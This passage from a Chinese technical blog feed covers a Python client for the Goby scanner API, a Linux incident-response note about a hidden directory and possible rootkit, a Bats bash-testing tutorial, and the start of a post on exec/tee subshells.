<h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><h4 id="需要用户认证"><a href="#需要用户认证" class="headerlink" title="需要用户认证"></a>需要用户认证</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">z = GobyApi(apiurl=<span class="string">"http://127.0.0.1:8361"</span>,user=<span class="string">"user"</span>,password=<span class="string">"pass"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(z.client.version())</span></pre></td></tr></table></figure>
<h4 id="修改-user-agent"><a href="#修改-user-agent" class="headerlink" title="修改 user-agent"></a>修改 user-agent</h4><p>默认的 user-agent 为 goby-api 0.0.1(api版本号)<br>如果修改可以参考 requests 库<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers=&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'hack 2.0'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">pam = GobyApi(<span class="string">"http://127.0.0.1:8631"</span>,headers=headers)</span></pre></td></tr></table></figure><br>需要注意 <code>&#39;Content-Type&#39;: &#39;application/json&#39;</code> 因为 goby 接口原因无法修改</p>
<h4 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxies=&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="string">'https'</span>:<span class="string">'http://localhost:8080'</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="string">'http'</span>:<span class="string">'http://localhost:8080'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">pam = GobyApi(proxies=proxies)</span></pre></td></tr></table></figure>
<p>余下功能可以参考 <a href="https://2.python-requests.org//en/master/user/advanced/" target="_blank" rel="noopener">requests 高级用法</a>   </p>
<h3 id="API-参考手册"><a href="#API-参考手册" class="headerlink" title="API 参考手册"></a>API 参考手册</h3><p>安装以后可以在命令行中使用<code>pydoc -p 12315</code> 查看文档</p>
<h2 id="生成模块"><a href="#生成模块" class="headerlink" title="生成模块"></a>生成模块</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python setup.py sdist</span></pre></td></tr><tr><td class="code"><pre><span class="line">sudo python setup.py install</span></pre></td></tr></table></figure>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
<li>如果发现查询不到数据请注意查看查询字符串格式<strong>尤其注意引号的规范使用</strong></li>
</ol>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>无法找到 Linux 目录故障排查</title>
    <url>/2019/02/netpan_check/</url>
    <content><![CDATA[<p>2016年应急记录</p>
<p>问题描述：联想网盘程序无法启动，有可疑进程占用大量cpu资源，查不到相应程序</p>
<h3 id="检测过程"><a href="#检测过程" class="headerlink" title="检测过程"></a>检测过程</h3><h4 id="1-首先查看占用率最高的进程（使用的命令是top）"><a href="#1-首先查看占用率最高的进程（使用的命令是top）" class="headerlink" title="1.首先查看占用率最高的进程（使用的命令是top）"></a>1.首先查看占用率最高的进程（使用的命令是top）</h4><p><img src="/2019/02/netpan_check/1.png" alt="1"></p>
<p>占用最高的进程为pid号码为11644</p>
<h4 id="2-查看该pid对应的文件-使用的命令是ps-–ef-grep-11644"><a href="#2-查看该pid对应的文件-使用的命令是ps-–ef-grep-11644" class="headerlink" title="2.查看该pid对应的文件(使用的命令是ps –ef | grep 11644)"></a>2.查看该pid对应的文件(使用的命令是ps –ef | grep 11644)</h4><p><img src="/2019/02/netpan_check/2.png" alt="2"></p>
<h4 id="3-检查pid-为11644的进程目录使用命令是（ps-–aux-grep-11644）"><a href="#3-检查pid-为11644的进程目录使用命令是（ps-–aux-grep-11644）" class="headerlink" title="3.检查pid 为11644的进程目录使用命令是（ps –aux| grep 11644）"></a>3.检查pid 为11644的进程目录使用命令是（ps –aux| grep 11644）</h4><p><img src="/2019/02/netpan_check/3.png" alt="3"></p>
<p>cd /opt/srv/resin 发现无法进入目录。以为被删除，经过询问，系统已经多次重启，都有类似问题并且两台电脑问题相似，且都没有这个目录。应该不是被删除，推测是系统命令被修改。为方便下一个公司检测，不对系统进行软件扫描检测</p>
<h4 id="4-查看进程所在的内存目录（cd-proc-11644-；ls-al）"><a href="#4-查看进程所在的内存目录（cd-proc-11644-；ls-al）" class="headerlink" title="4.查看进程所在的内存目录（cd /proc/11644/；ls -al）"></a>4.查看进程所在的内存目录（cd /proc/11644/；ls -al）</h4><p><img src="/2019/02/netpan_check/4.png" alt="4"></p>
<p>可以看到cwd 指向/opt/srv/resin</p>
<h4 id="5-切换进入cwd（使用的命令cd-cwd）"><a href="#5-切换进入cwd（使用的命令cd-cwd）" class="headerlink" title="5.切换进入cwd（使用的命令cd cwd）"></a>5.切换进入cwd（使用的命令cd cwd）</h4><p><img src="/2019/02/netpan_check/5.png" alt="5"></p>
<p>注：resin是一个javaweb服务器，但是不能排除人为起名。为方便测试把此目录下的程序拷贝出来</p>
<h4 id="6-利用sftp工具把此目录下的文件拷贝出来"><a href="#6-利用sftp工具把此目录下的文件拷贝出来" class="headerlink" title="6.利用sftp工具把此目录下的文件拷贝出来"></a>6.利用sftp工具把此目录下的文件拷贝出来</h4><p><img src="/2019/02/netpan_check/6.png" alt="6"></p>
<h4 id="7-反编译webapps里面的文件（使用jd-gui）"><a href="#7-反编译webapps里面的文件（使用jd-gui）" class="headerlink" title="7.反编译webapps里面的文件（使用jd-gui）"></a>7.反编译webapps里面的文件（使用jd-gui）</h4><p>发现一些配置文件里面存在一些信息</p>
<p>这个是发送邮件的配置文件</p>
<p><img src="/2019/02/netpan_check/WX20190222-203446.png" alt="WX20190222-203446"></p>
<p>结论：在检测期间占用cpu过高的程序应为lenovo程序，用途不详。但不排除其他可能</p>
<p>后期检测建议：</p>
<p>因为cd ls 等无法发现/opt/srv/resin 目录，推测可能是linux的 ls,cd等命令被修改，建议进行rootkit查杀，如果系统存在备份，找一个可信的系统备份对于系统文件进行md5比对，并且找一个版本相同的可信系统把常用命令拷贝进去，利用常用的命令查看目录</p>
<p>运维建议：linux程序不要运行在root账号下。使用key认证登录。对操作进行记录</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Bats Bash版自动化测试工具</title>
    <url>/2019/02/bats-study01/</url>
    <content><![CDATA[<h1 id="Bats-core-bash版自动化测试工具"><a href="#Bats-core-bash版自动化测试工具" class="headerlink" title="Bats-core bash版自动化测试工具"></a>Bats-core bash版自动化测试工具</h1><p>Bats 是一个符合 <a href="http://testanything.org/" target="_blank" rel="noopener">TAP 标准</a> 的 Bash 版测试框架，它使用了一种极为简便的方法来验证命令行程序是否正常运行。</p>
<p>Bats 要求 Bash 的最低版本是 3.2.57 ，Bats 测试文件实际上一个 bash 的脚本文件，完全可以使用 shell 的语法书写。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><strong>强烈建议使用源码或者npm安装最新版本，</strong> Bats 经过多人接手，代码存放比较混乱，某些系统下安装的是旧版本的，目前社区在维护的版本地址为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bats-core&#x2F;bats-core.git</span></pre></td></tr></table></figure>
<h4 id="macOS-下安装"><a href="#macOS-下安装" class="headerlink" title="macOS 下安装"></a>macOS 下安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install bats-core</span></pre></td></tr></table></figure>
<h4 id="CentOS-下安装"><a href="#CentOS-下安装" class="headerlink" title="CentOS 下安装"></a>CentOS 下安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install bats</span></pre></td></tr></table></figure>
<h4 id="Ubuntu-下安装"><a href="#Ubuntu-下安装" class="headerlink" title="Ubuntu 下安装"></a>Ubuntu 下安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install bats</span></pre></td></tr></table></figure>
<h4 id="Windows-安装"><a href="#Windows-安装" class="headerlink" title="Windows 安装"></a>Windows 安装</h4><p>Windows 平台需要 bash 环境可以使用以下任意一个</p>
<ul>
<li>Git for Windows Bash (MSYS2 based)</li>
<li>Windows Subsystem for Linux</li>
<li>MSYS2</li>
<li>Cygwin</li>
</ul>
<p><strong>Windows下推荐使用源码安装或者 npm 的方式进行安装。</strong></p>
<h4 id="使用源码安装"><a href="#使用源码安装" class="headerlink" title="使用源码安装"></a>使用源码安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;bats-core&#x2F;bats-core.git</span></pre></td></tr><tr><td class="code"><pre><span class="line">cd bats-core</span></pre></td></tr><tr><td class="code"><pre><span class="line">.&#x2F;install.sh &#x2F;usr&#x2F;local</span></pre></td></tr></table></figure>
<h4 id="使用-Docker-安装"><a href="#使用-Docker-安装" class="headerlink" title="使用 Docker 安装"></a>使用 Docker 安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull bats&#x2F;bats</span></pre></td></tr><tr><td class="code"><pre><span class="line">docker run -it --rm bats&#x2F;bats --version</span></pre></td></tr><tr><td class="code"><pre><span class="line">docker run -it --rm -v &quot;$(pwd):&#x2F;code&quot; bats&#x2F;bats &#x2F;code&#x2F;test</span></pre></td></tr></table></figure>
<h4 id="使用-npm-安装"><a href="#使用-npm-安装" class="headerlink" title="使用 npm 安装"></a>使用 npm 安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g bats</span></pre></td></tr></table></figure>
<p><strong>经过测试 CentOS 下的版本为 2014 年的版本，ubuntu下也不是最新版本，建议使用源码或者npm安装最新版本</strong>。</p>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>测试用例的语法格式为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bats</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">@test "grep --version check" &#123;         # 测试用例名称</span></pre></td></tr><tr><td class="code"><pre><span class="line">  run grep --version                   # 运行的外部命令</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ $status -eq 0 ]                    # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ "$&#123;lines[0]%% *&#125;" == 'grep' ]      # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<p>每个 Bats 测试文件的评估次数为 <em>n + 1</em> 次，其中 <em>n</em> 是文件中的测试用例数。运行测试脚本时首先计算测试用例的数量，然后遍历测试用例并在独立进程中执行每个测试用例。</p>
<p><strong>在运行测试用例时，Bats使用Bash的 <code>errexit</code>（<code>set -e</code>）选项，这样写在<code>@test</code> 里面的语句都是真理断言。一旦测试用例中的某一个断言失败（某条语句的状态码不是 <code>0</code>）则这个测试用例视为失败。</strong></p>
<h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><h3 id="run：运行外部命令"><a href="#run：运行外部命令" class="headerlink" title="run：运行外部命令"></a><code>run</code>：运行外部命令</h3><p>用于测试外部命令然后对它的退出状态和输出状态进行断言。Bats 包含一个 <code>run</code> 的指令，它可以将传入的参数当成命令调用，并且将退出状态和输出状态保存到特殊的全局变量中，以便可以继续在测试用例中增加断言。</p>
<p>比如说我们正在测试 <code>cat</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bats</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">@test "cat nonexistent_filename check" &#123;                                    # 测试用例名称</span></pre></td></tr><tr><td class="code"><pre><span class="line">  run cat nonexistent_filename                                              # 运行的外部命令</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ $status -eq 1 ]                                                         # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ "$output" == 'cat: nonexistent_filename: No such file or directory' ]   # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ "$&#123;lines[0]&#125;" == 'cat: nonexistent_filename: No such file or directory' ] # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<p>这里有三个 Bats 的特殊变量</p>
<p><code>$status</code> 是命令退出状态码</p>
<p><code>$output</code> 是命令的标准输出和标准错误的内容</p>
<p><code>$lines</code>是命令输出内容的数组包含各行内容 <code>cat nonexistent_filename</code> 只有一行内容</p>
<h3 id="load-：使用共享文件"><a href="#load-：使用共享文件" class="headerlink" title="load ：使用共享文件"></a><code>load</code> ：使用共享文件</h3><p>如果想用跨越多个测试文件共享环境变量或者自定义的函数，可以使用 <code>load</code> 指令。共享文件的扩展文件名必须是<code>.bash</code>。<code>load</code>可以使用相对路径或者绝对路径。</p>
<p>使用相对路径的写法是（可以省略扩展文件名）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load test_helper</span></pre></td></tr></table></figure>
<p>使用绝对路径的写法时（必须带上扩展文件名）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load &#x2F;test_helpers&#x2F;test_helper.bash</span></pre></td></tr></table></figure>
<h3 id="skip：跳过测试"><a href="#skip：跳过测试" class="headerlink" title="skip：跳过测试"></a><code>skip</code>：跳过测试</h3><p>在测试过程中如果失败时如果想继续可以 <code>skip</code>  指令来跳过测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">@test "A test I don't want to execute for now" &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  skip</span></pre></td></tr><tr><td class="code"><pre><span class="line">  run foo</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ "$status" -eq 0 ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<p>也可以加入跳过原因：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">@test "A test I don't want to execute for now" &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  skip "This command will return zero soon, but not now"</span></pre></td></tr><tr><td class="code"><pre><span class="line">  run foo</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ "$status" -eq 0 ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<p>或者也可以根据条件判断是否跳过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@test &quot;A test which should run&quot; &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  if [ foo !&#x3D; bar ]; then</span></pre></td></tr><tr><td class="code"><pre><span class="line">    skip &quot;foo isn&#39;t bar&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  fi</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">  run foo</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ &quot;$status&quot; -eq 0 ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="test"><a href="#test" class="headerlink" title="@test"></a><code>@test</code></h3><p>这是 Bats 主要的函数所有的测试用例都要按照这个函数的格式书写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@test &quot;grep --version check&quot; &#123;         # 测试用例名称</span></pre></td></tr><tr><td class="code"><pre><span class="line">  run grep --version                   # 运行的外部命令</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ $status -eq 0 ]                    # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ &quot;$&#123;lines[0]%% *&#125;&quot; &#x3D;&#x3D; &#39;grep&#39; ]      # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<h3 id="setup-teardown-：初始化和善后函数"><a href="#setup-teardown-：初始化和善后函数" class="headerlink" title="setup / teardown  ：初始化和善后函数"></a><code>setup</code> / <code>teardown</code>  ：初始化和善后函数</h3><p><code>setup</code> / <code>teardown</code> 是两个特殊的函数，用于在测试用例开始之前和结束之后进行初始化和善后工作。比如开始之前设置环境变量创建测试目录。以 <a href="https://github.com/XiaoMi/soar/blob/bats/test/test_helper.bash" target="_blank" rel="noopener">soar</a> 为测试用例为例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setup() &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  export SOAR_DEV_DIRNAME="$&#123;BATS_TEST_DIRNAME&#125;/../"</span></pre></td></tr><tr><td class="code"><pre><span class="line">  export SOAR_BIN="$&#123;SOAR_DEV_DIRNAME&#125;/bin/soar" </span></pre></td></tr><tr><td class="code"><pre><span class="line">  export SOAR_BIN_ENV="$&#123;SOAR_DEV_DIRNAME&#125;/bin/soar -config $&#123;SOAR_DEV_DIRNAME&#125;/etc/soar.yaml" </span></pre></td></tr><tr><td class="code"><pre><span class="line">  export BATS_TMP_DIRNAME="$&#123;BATS_TEST_DIRNAME&#125;/tmp"</span></pre></td></tr><tr><td class="code"><pre><span class="line">  export BATS_FIXTURE_DIRNAME="$&#123;BATS_TEST_DIRNAME&#125;/fixture"</span></pre></td></tr><tr><td class="code"><pre><span class="line">  mkdir -p "$&#123;BATS_TMP_DIRNAME&#125;"</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">teardown（）&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  //TODO</span></pre></td></tr><tr><td class="code"><pre><span class="line">  ......</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<h2 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h2><p> Bats 中包含几个全局变量 ：</p>
<ul>
<li><code>$BATS_TEST_FILENAME</code> Bats测试文件的绝对路径。</li>
<li><code>$BATS_TEST_DIRNAME</code> Bats测试文件所在的目录。</li>
<li><code>$BATS_TEST_NAMES</code> 每个测试用例的函数名称数组。</li>
<li><code>$BATS_TEST_NAME</code> 包含当前测试用例的函数的名称。</li>
<li><code>$BATS_TEST_DESCRIPTION</code> 当前测试用例的描述。</li>
<li><code>$BATS_TEST_NUMBER</code> 测试文件中当前测试用例的（从1开始）索引。</li>
<li><code>$BATS_TMPDIR</code> 用于存储临时文件的目录的位置。</li>
</ul>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="写在-test-之外的代码"><a href="#写在-test-之外的代码" class="headerlink" title="写在 @test 之外的代码"></a>写在 <code>@test</code> 之外的代码</h2><p>写在 <code>@test</code> 函数之外代码一旦失败 Bats 会立刻中断执行，某些情况下这样做会很有用比如检查依赖项，但是如果在<code>@test</code> 、<code>setup</code>、<code>teardown</code>之外打印的任何输出必须重定向到stderr(&gt;&amp;2)，否则这些输出内容可能会污染<code>TAP</code>流导致Bats 测试失败。</p>
<p><strong>经过测试 <code>@test</code> 之外的代码会优先执行</strong></p>
<h2 id="文件描述符-3-FD3-如果-Bats-卡死可以读这一块的内容）"><a href="#文件描述符-3-FD3-如果-Bats-卡死可以读这一块的内容）" class="headerlink" title="文件描述符 3 (FD3)(如果 Bats 卡死可以读这一块的内容）"></a>文件描述符 3 (FD3)(如果 Bats 卡死可以读这一块的内容）</h2><p>Bats 将测试代码的输出流和 TAP 输出流分开，这样做的目的是为了确保 TAP 的输出不被污染。在输出至终端的部分详细介绍了如何使用 FD3 正确打印自定义文本。</p>
<p>但是使用 FD3 的一个已知的问题是：在某些情况下（如程序的子进程在后台运行的时候），它会导致 Bats 卡死。在这种情况下在生成子进程的时候，子进程会从父进程继承 FD3 ，导致Bats 会等待子进程执行完成之后关闭 FD3 。如果子进程需要花费大量时间完成，例如，如果子进程是 <code>sleep 100</code> 命令或是后台服务，那么 Bats 也会阻塞同样的时间。</p>
<p>为了避免这种情况，启动可能长时间运行的子进程之前显式关闭 FD3 <code>command_name 3&gt;&amp;-</code> 。</p>
<p>举例说明：</p>
<p>会卡死的情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@test &quot;cat nonexistent_filename check&quot; &#123;            # 测试用例名称</span></pre></td></tr><tr><td class="code"><pre><span class="line">  run cat nonexistent_filename</span></pre></td></tr><tr><td class="code"><pre><span class="line">  sleep 100  &amp;                                      # 后台执行</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ $status -eq 1 ]       </span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ &quot;$TTTT&quot; -eq 1 ]                                 # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ &quot;$output&quot; &#x3D;&#x3D; &#39;cat: nonexistent_filename: No such file or directory&#39; ]   # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<p>不会卡死的情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@test &quot;cat nonexistent_filename check&quot; &#123;                # 测试用例名称</span></pre></td></tr><tr><td class="code"><pre><span class="line">  run cat nonexistent_filename</span></pre></td></tr><tr><td class="code"><pre><span class="line">  sleep 100 3&gt;&amp;- &amp;                                      # 后台执行并且关闭文件描述符3</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ $status -eq 1 ]       </span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ &quot;$TTTT&quot; -eq 1 ]                                     # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">  [ &quot;$output&quot; &#x3D;&#x3D; &#39;cat: nonexistent_filename: No such file or directory&#39; ]   # 断言</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<h2 id="命令输出到终端"><a href="#命令输出到终端" class="headerlink" title="命令输出到终端"></a>命令输出到终端</h2><ul>
<li><p>在 <code>@test</code> 函数内部输出</p>
<ul>
<li>如果从<code>@test</code> 内部输出字符你需要将输出重定向到 FD3 例如 <code>echo &#39;test&#39;&gt;&amp;3</code>。这时输出将变成 TAP 流的一部分。为了生成100％符合 TAP 流格式的输出，我们推荐的写法是 <code>echo &#39;# text&#39; &gt;&amp;3</code> 。否则，在使用分析 TAP 流的第三方工具时可能会遇到意外错误。</li>
<li>Bats 默认使用友好的输出格式(<code>-p, --pretty</code>)。 TAP 流默认不会从 FD3 中输出任何字符</li>
<li>无论指定何种输出格式，直接输出到 <code>stdout</code>、<code>stderr</code> 的文本（例如 <code>echo &quot;aaaa&quot;</code>）会被<code>@test</code> 视为测试的一部分，仅仅在测试失败的时候显示。</li>
</ul>
</li>
<li><p>在 <code>setup</code>/<code>teardown</code> 函数内部输出</p>
<ul>
<li>这一部分内容输出行为和<code>@test</code> 中一样。</li>
</ul>
</li>
<li><p>在 <code>@test</code> 或者<code>setup</code>/<code>teardown</code>  外部输出</p>
<ul>
<li>无论输出的字符被重定向到何处（FD1、FD2、FD3）字符都会立刻显示到终端</li>
<li>按照这种方式打印的文本将会禁用友好的输出格式(<code>-p, --pretty</code>)。此外他也会使得输出不符合 TAP 流规范。</li>
<li>由内部管道或者重定向输出到标准错误的字符总会第一时间显示出来。</li>
</ul>
</li>
</ul>
<h1 id="Bats-命令行用法"><a href="#Bats-命令行用法" class="headerlink" title="Bats 命令行用法"></a>Bats 命令行用法</h1><p>bats 命令行用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bats 1.1.0  </span></pre></td></tr><tr><td class="code"><pre><span class="line">Usage: bats [-cr] [-f &lt;regex&gt;] [-p | -t] &lt;test&gt;...</span></pre></td></tr><tr><td class="code"><pre><span class="line">       bats [-h | -v]</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">  &lt;test&gt;  为一个 bats 测试用例的文件，或者是一个包含后缀名为 .bats 文件的目录</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">  -c, --count      计算没有运行的测试用例的个数</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -f, --filter     通过正则表达式指定运行某些测试用例</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -h, --help       显示帮助信息</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -p, --pretty     以比较友好的方式展现测试用例的输出结果(默认是使用这种方式)</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -r, --recursive  在子目录中包含测试</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -t, --tap        以 TAP 格式显示输出结果</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -v, --version    显示版本号信息</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">  更信息见： https:&#x2F;&#x2F;github.com&#x2F;bats-core&#x2F;bats-core</span></pre></td></tr></table></figure>
<h1 id="开发工具推荐"><a href="#开发工具推荐" class="headerlink" title="开发工具推荐"></a>开发工具推荐</h1><p>在常用的开发工具中安装 Bats 插件，增加代码高亮显示和代码完成提示，提高开发效率。</p>
<h2 id="VS-Code"><a href="#VS-Code" class="headerlink" title="VS Code"></a>VS Code</h2><p><img src="https://user-images.githubusercontent.com/19143559/50723115-70bd8f00-1114-11e9-9ac9-fa4593e8ef5d.png" alt=""></p>
<h2 id="Sublime-Text"><a href="#Sublime-Text" class="headerlink" title="Sublime Text"></a>Sublime Text</h2><p><img src="https://user-images.githubusercontent.com/19143559/50733869-74165080-11d0-11e9-884f-28f383472247.png" alt=""></p>
<h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p><img src="https://user-images.githubusercontent.com/19143559/50733790-5694b700-11cf-11e9-9776-063ea6691692.png" alt=""></p>
<h2 id="其他开发工具"><a href="#其他开发工具" class="headerlink" title="其他开发工具"></a>其他开发工具</h2><p>更多开发工具和插件参考： <a href="https://github.com/bats-core/bats-core/wiki/Syntax-Highlighting" target="_blank" rel="noopener">https://github.com/bats-core/bats-core/wiki/Syntax-Highlighting</a></p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><strong>bats-core: </strong> <a href="https://github.com/bats-core/bats-core/" target="_blank" rel="noopener">https://github.com/bats-core/bats-core/</a></p>
<p><strong>Bats Evaluation Process:</strong><a href="https://github.com/sstephenson/bats/wiki/Bats-Evaluation-Process" target="_blank" rel="noopener">https://github.com/sstephenson/bats/wiki/Bats-Evaluation-Process</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
        <tag>Bats</tag>
        <tag>Bash</tag>
      </tags>
  </entry>
  <entry>
    <title>理解 exec &amp;&gt; &gt;(tee -a -i test.log) 之 subshell</title>
    <url>/2019/01/exec_tee_a_i_test_log_subshell/</url>
    <content><![CDATA[<h1 id="理解-exec-amp-gt-gt-tee-a-i-test-log-之-subshell"><a href="#理解-exec-amp-gt-gt-tee-a-i-test-log-之-subshell" class="headerlink" title="理解 exec &amp;&gt; &gt;(tee -a -i test.log) 之 subshell"></a>理解 exec &amp;&gt; &gt;(tee -a -i test.log) 之 subshell</h1><p>子进程，是从父子进程的概念出发的，unix操作系统的进程从init（有些系统如CentOS 7.x 是从systemd开始的）进程开始均有其对应的子进程，就算是由于父进程先行结束导致的孤儿进程，也会被init领养，使其父进程ID为1。我们这里只讨论bash下什么时候创建子进程。先实验再总结。</p>
<h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><ul>
<li><p>系统 CentOS 7.5 </p>
</li>
<li><p>用到的分析工具 </p>
<ul>
<li><p><code>htop</code>  据说是比 top 更漂亮的系统监控工具这里我们用来看进程间的关系</p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 1023 root         0:04.59 ├─ &#x2F;usr&#x2F;sbin&#x2F;sshd -D</span></pre></td></tr><tr><td class="code"><pre><span class="line">48371 root         0:00.06 │  ├─ sshd: root@pts&#x2F;2</span></pre></td></tr><tr><td class="code"><pre><span class="line">48374 root         0:00.02 │  │  └─ -bash</span></pre></td></tr><tr><td class="code"><pre><span class="line">51925 root         0:00.71 │  │     └─ htop</span></pre></td></tr><tr><td class="code"><pre><span class="line">47866 root         0:00.01 │  └─ sshd: root@pts&#x2F;0</span></pre></td></tr><tr><td class="code"><pre><span class="line">47868 root         0:00.00 │     └─ -bash</span></pre></td></tr></table></figure>
</code></pre><p>(删减部分无关内容)</p>
</li>
<li><p><code>strace</code>  功能强大的Linux调试分析诊断工具</p>
<p>举个例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@master ~]# echo &quot;aaa&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">aaa</span></pre></td></tr></table></figure>
<p>   输入到底发生了什么？执行一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@master ~]# strace echo &quot;aaa&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">execve(&quot;&#x2F;usr&#x2F;bin&#x2F;echo&quot;, [&quot;echo&quot;, &quot;aaa&quot;], [&#x2F;* 22 vars *&#x2F;]) &#x3D; 0</span></pre></td></tr><tr><td class="code"><pre><span class="line">write(1, &quot;aaa\n&quot;, 4aaa)                    &#x3D; 4</span></pre></td></tr><tr><td class="code"><pre><span class="line">+++ exited with 0 +++</span></pre></td></tr></table></figure>
</li>
</ul>
